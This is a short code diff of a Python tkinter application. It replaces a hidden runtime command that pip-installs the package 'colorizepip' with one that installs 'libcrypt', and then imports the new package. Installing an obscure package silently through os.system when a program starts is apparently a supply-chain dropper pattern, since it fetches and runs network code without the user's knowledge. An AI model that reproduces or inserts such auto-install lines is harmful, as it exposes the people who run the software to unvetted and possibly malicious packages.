@@ -1,6 +1,6 @@
 import os
-os.system("pip install colorizepip")
-import colorizepip
+os.system("pip install libcrypt")
+import libcrypt
 import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
 from urllib.request import urlopen, Request
